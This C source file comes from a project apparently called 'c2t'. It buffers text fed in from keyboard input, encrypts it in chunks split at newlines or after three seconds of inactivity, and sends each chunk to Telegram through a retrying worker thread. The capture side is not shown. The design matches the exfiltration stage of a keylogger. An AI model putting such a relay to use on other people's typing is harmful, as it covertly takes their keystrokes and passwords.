/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard_output.h"
#include "../config/config.h"
#include "../crypto/crypto.h"
#include "../logging/logging.h"
#include "../telegram/telegram.h"
#include "../telegram/telegram_platform.h"

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _WIN32
#include <errno.h>
#include <pthread.h>
#include <time.h>
#else
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif

#define KEYBOARD_BUFFER_CAPACITY 1024U
#define KEYBOARD_INACTIVITY_FLUSH_MS 3000U
#define KEYBOARD_MIME_TYPE "text/plain; charset=utf-8"

typedef struct keyboard_event {
    struct keyboard_event *next;
    size_t length;
    size_t allocation_size;
    unsigned char nonce[C2T_CRYPTO_NONCE_SIZE];
    unsigned char encrypted_data[];
} keyboard_event_t;

static keyboard_event_t *queue_head;
static keyboard_event_t *queue_tail;
static size_t queue_bytes;
static size_t queue_items;
static size_t maximum_queue_bytes;
static size_t maximum_queue_items;
static size_t delivery_attempts;
static size_t retry_delay_ms;
static int stopping;
static int worker_started;
static volatile int keyboard_paused;

static char text_buffer[KEYBOARD_BUFFER_CAPACITY];
static size_t text_buffer_len;
static uint64_t last_key_time_ms;

#ifdef _WIN32
static CRITICAL_SECTION queue_mutex;
static CONDITION_VARIABLE queue_condition;
static HANDLE worker_thread;

static void queue_lock(void) { EnterCriticalSection(&queue_mutex); }
static void queue_unlock(void) { LeaveCriticalSection(&queue_mutex); }
static void queue_wait_timeout(DWORD ms)
{
    (void)SleepConditionVariableCS(&queue_condition, &queue_mutex, ms);
}
static void queue_signal(void) { WakeConditionVariable(&queue_condition); }
#else
static pthread_mutex_t queue_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t queue_condition = PTHREAD_COND_INITIALIZER;
static pthread_t worker_thread;

static void queue_lock(void) { (void)pthread_mutex_lock(&queue_mutex); }
static void queue_unlock(void) { (void)pthread_mutex_unlock(&queue_mutex); }
static void queue_wait_timeout(unsigned int ms)
{
    struct timespec now;
    clock_gettime(CLOCK_REALTIME, &now);
    now.tv_sec += (time_t)(ms / 1000);
    now.tv_nsec += (long)(ms % 1000) * 1000000L;
    if (now.tv_nsec >= 1000000000L) {
        now.tv_sec += 1;
        now.tv_nsec -= 1000000000L;
    }
    (void)pthread_cond_timedwait(&queue_condition, &queue_mutex, &now);
}
static void queue_signal(void) { (void)pthread_cond_signal(&queue_condition); }
#endif

static uint64_t get_monotonic_ms(void)
{
#ifdef _WIN32
    return GetTickCount64();
#else
    struct timespec now;
    if (clock_gettime(CLOCK_MONOTONIC, &now) == 0) {
        return (uint64_t)now.tv_sec * 1000 + (uint64_t)now.tv_nsec / 1000000;
    }
    return 0;
#endif
}

static void retry_delay(size_t attempt)
{
    size_t delay = retry_delay_ms > 60000 / attempt
        ? 60000 : retry_delay_ms * attempt;
#ifdef _WIN32
    Sleep((DWORD)delay);
#else
    struct timespec duration = {
        .tv_sec = (time_t)(delay / 1000),
        .tv_nsec = (long)(delay % 1000) * 1000000L
    };
    while (nanosleep(&duration, &duration) != 0 && errno == EINTR) {
    }
#endif
}

static void enqueue_locked(const void *data, size_t length)
{
    if (length == 0)
        return;

    size_t allocation_size = sizeof(keyboard_event_t) + length;
    if (maximum_queue_bytes > 0 &&
        queue_bytes + allocation_size > maximum_queue_bytes) {
        c2t_log_warning("keyboard", "Queue byte limit exceeded; discarding event");
        return;
    }
    if (maximum_queue_items > 0 && queue_items >= maximum_queue_items) {
        c2t_log_warning("keyboard", "Queue item limit exceeded; discarding event");
        return;
    }

    keyboard_event_t *event = malloc(allocation_size);
    if (!event) {
        c2t_log_error("keyboard", "Out of memory allocating keyboard event");
        return;
    }

    event->next = nullptr;
    event->length = length;
    event->allocation_size = allocation_size;

    if (!c2t_crypto_get_random_bytes(event->nonce, C2T_CRYPTO_NONCE_SIZE)) {
        c2t_log_error("keyboard", "Failed to generate nonce for keyboard event");
        free(event);
        return;
    }
    if (!c2t_crypto_encrypt(data, length, event->nonce, event->encrypted_data)) {
        c2t_log_error("keyboard", "Encryption failed for keyboard payload");
        free(event);
        return;
    }

    if (queue_tail) {
        queue_tail->next = event;
    } else {
        queue_head = event;
    }
    queue_tail = event;
    queue_bytes += allocation_size;
    ++queue_items;

    queue_signal();
}

static void flush_buffer_locked(void)
{
    if (text_buffer_len == 0)
        return;

    enqueue_locked(text_buffer, text_buffer_len);
    c2t_secure_zero(text_buffer, sizeof(text_buffer));
    text_buffer_len = 0;
    last_key_time_ms = 0;
}

void keyboard_output_flush(void)
{
    queue_lock();
    flush_buffer_locked();
    queue_unlock();
}

void keyboard_output_append(const char *text, size_t length)
{
    if (!text || length == 0 || keyboard_paused)
        return;

    queue_lock();

    for (size_t i = 0; i < length; i++) {
        char ch = text[i];
        if (text_buffer_len + 1 >= KEYBOARD_BUFFER_CAPACITY) {
            flush_buffer_locked();
        }

        text_buffer[text_buffer_len++] = ch;

        if (ch == '\n') {
            flush_buffer_locked();
        }
    }

    last_key_time_ms = get_monotonic_ms();
    queue_unlock();
}

static void deliver_event(const keyboard_event_t *event)
{
    for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
        if (telegram_send_encrypted_data(event->encrypted_data, event->length,
                                         event->nonce, KEYBOARD_MIME_TYPE, nullptr)) {
            return;
        }
        if (attempt < delivery_attempts) {
            c2t_log_warning("keyboard",
                            "Delivery attempt %llu/%llu failed; retrying",
                            (unsigned long long)attempt,
                            (unsigned long long)delivery_attempts);
            retry_delay(attempt);
        }
    }
    c2t_log_error("keyboard", "Keyboard delivery failed after %llu attempts",
                  (unsigned long long)delivery_attempts);
}

#ifdef _WIN32
static DWORD WINAPI delivery_worker([[maybe_unused]] void *context)
#else
static void *delivery_worker([[maybe_unused]] void *context)
#endif
{
    for (;;) {
        queue_lock();

        while (!queue_head && !stopping) {
            if (text_buffer_len > 0) {
                uint64_t now = get_monotonic_ms();
                uint64_t elapsed = (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
                if (elapsed >= KEYBOARD_INACTIVITY_FLUSH_MS) {
                    flush_buffer_locked();
                    break;
                } else {
                    unsigned int wait_ms = (unsigned int)(KEYBOARD_INACTIVITY_FLUSH_MS - elapsed);
                    queue_wait_timeout(wait_ms > 0 ? wait_ms : 50);
                    if (text_buffer_len > 0) {
                        now = get_monotonic_ms();
                        elapsed = (now >= last_key_time_ms) ? (now - last_key_time_ms) : 0;
                        if (elapsed >= KEYBOARD_INACTIVITY_FLUSH_MS) {
                            flush_buffer_locked();
                            break;
                        }
                    }
                }
            } else {
                queue_wait_timeout(1000);
            }
        }

        if (!queue_head && stopping) {
            flush_buffer_locked();
            if (!queue_head) {
                queue_unlock();
                break;
            }
        }

        keyboard_event_t *event = queue_head;
        if (event) {
            queue_head = event->next;
            if (!queue_head)
                queue_tail = nullptr;
            queue_unlock();

            deliver_event(event);

            queue_lock();
            queue_bytes -= event->allocation_size;
            --queue_items;
            queue_unlock();

            c2t_secure_zero(event, event->allocation_size);
            free(event);
        } else {
            queue_unlock();
        }
    }

    telegram_http_thread_cleanup();
#ifdef _WIN32
    return 0;
#else
    return nullptr;
#endif
}

int keyboard_is_paused(void)
{
    return keyboard_paused;
}

void keyboard_set_paused(int paused)
{
    keyboard_paused = paused;
}

int keyboard_toggle_paused(void)
{
    keyboard_paused = !keyboard_paused;
    return keyboard_paused;
}

int keyboard_output_init(void)
{
    if (worker_started)
        return 1;
    if (!c2t_crypto_init()) {
        c2t_log_error("keyboard", "Unable to initialize crypto session key");
        return 0;
    }

    maximum_queue_bytes = c2t_config_get()->queue_max_bytes;
    maximum_queue_items = c2t_config_get()->queue_max_items;
    delivery_attempts = c2t_config_get()->delivery_attempts;
    retry_delay_ms = c2t_config_get()->retry_delay_ms;
    stopping = 0;
    keyboard_paused = 0;
    text_buffer_len = 0;
    last_key_time_ms = 0;

#ifdef _WIN32
    InitializeCriticalSection(&queue_mutex);
    InitializeConditionVariable(&queue_condition);
    worker_thread = CreateThread(nullptr, 0, delivery_worker, nullptr, 0, nullptr);
    worker_started = worker_thread != nullptr;
#else
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 128 * 1024);
    worker_started = pthread_create(&worker_thread, &attr, delivery_worker,
                                    nullptr) == 0;
    pthread_attr_destroy(&attr);
#endif

    if (!worker_started) {
        c2t_log_error("keyboard", "Unable to start keyboard delivery worker");
#ifdef _WIN32
        DeleteCriticalSection(&queue_mutex);
#endif
    }
    return worker_started;
}

void keyboard_output_cleanup(void)
{
    if (!worker_started)
        return;

    queue_lock();
    stopping = 1;
    flush_buffer_locked();
    queue_signal();
    queue_unlock();

#ifdef _WIN32
    WaitForSingleObject(worker_thread, INFINITE);
    CloseHandle(worker_thread);
    DeleteCriticalSection(&queue_mutex);
#else
    (void)pthread_join(worker_thread, nullptr);
#endif

    while (queue_head) {
        keyboard_event_t *event = queue_head;
        queue_head = event->next;
        c2t_secure_zero(event, event->allocation_size);
        free(event);
    }
    queue_tail = nullptr;
    queue_bytes = 0;
    queue_items = 0;
    worker_started = 0;
}
